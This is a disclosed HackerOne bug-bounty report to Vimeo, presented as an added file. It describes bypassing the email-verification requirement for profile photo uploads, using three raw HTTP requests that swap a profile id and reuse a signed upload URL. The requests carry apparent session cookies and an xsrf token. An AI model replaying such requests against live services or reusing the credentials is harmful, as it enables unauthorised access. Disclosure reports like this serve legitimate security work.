@@ -1,0 +1,101 @@
+ReportLink:https://hackerone.com/reports/43758
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/defmax
+ReportedTo:Vimeo(vimeo)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:17.02.2015 7:45:44
+
+Summary:
+
+hello sir 
+
+this is N B Sri Harsha again 
+
+ as per vimeo rules , we are not allow to  upload photo until we verify our email id
+
+i have bypassed it ! 
+
+steps  to reproduce 
+
+
+you need to make three requests 
+
+1) 
+
+POST /upload/_get_image_url HTTP/1.1
+Host: vimeo.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Request: JSON
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Referer: https://vimeo.com/settings/profile
+Content-Length: 25
+Cookie: vuid=696284419.1803352017; __utma=18302654.25426463.1421254575.1421254575.1421254575.1; __utmb=18302654.5.9.1421254612869; __utmc=18302654; __utmz=18302654.1421254575.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmv=18302654.|2=user_type=pro=1^3=ms=0=1^7=video_count=0=1; vimeo=epk9k9dxcd70pcdxcxtdtr27jpcdxcxtd9c97%2Cp5dt00csudt0du92ctvvw9dxtt22ddwcwdvm2svsr; site_settings=%7B%22sticky_page%22%3Anull%7D; has_logged_in=1; stats_start_date=2015%2F01%2F10; stats_end_date=2015%2F01%2F14; __utmli=upload; xsrft=4213429db9ce9b8555b31f03e70518f2.acd22c2a2bdf0aed2889ddb61d9e34d7
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+type=portrait&id=36364214 
+
+change the id to our  id !
+
+after running this u will get an response as 
+
+
+HTTP/1.1 200 OK
+Date: Wed, 14 Jan 2015 16:57:52 GMT
+Server: Apache
+Expires: Wed, 14 Jan 2015 04:57:52 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: post-check=0, pre-check=0
+Set-Cookie: vimeo=epk9k9dxcd70pcdxcxtdtr27jpcdxcxtd9rx7%2Cpccvvxwwmstmdwkctvss9tfrwxm5usd2tkuccsdkk; expires=Fri, 13-Feb-2015 16:57:52 GMT; path=/; domain=.vimeo.com; httponly
+Vary: User-Agent,Accept-Encoding
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-UA-Compatible: IE=edge
+X-Frame-Options: sameorigin
+Content-Security-Policy-Report-Only: default-src https: data: 'unsafe-inline' 'unsafe-eval'; report-uri /_csp
+Content-Length: 112
+Connection: close
+Content-Type: application/json; charset=UTF-8
+
+"https:\/\/i.cloud.vimeo.com\/portrait\/9001351?expires=1421254732&sig=a9ff5f12100239d40f9872d7f36f17216e659754"
+
+
+next make a request using by before response 
+
+OPTIONS /portrait/9001351?expires=1421254732&sig=a9ff5f12100239d40f9872d7f36f17216e659754 HTTP/1.1
+Host: i.cloud.vimeo.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Origin: https://vimeo.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: content-type
+Connection: keep-alive
+
+
+next  make an request like this 
+
+PUT /portrait/9001351?expires=1421254732&sig=a9ff5f12100239d40f9872d7f36f17216e659754 HTTP/1.1
+Host: i.cloud.vimeo.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/offset+octet-stream
+Referer: https://vimeo.com/settings/profile
+Content-Length: 561276
+Origin: https://vimeo.com
+Connection: keep-alive
+
+{{image code here , u can get the code by editing image in notepad }}
+
+
+by this i could bypass the restriction and i could upload photo without verifying email id 
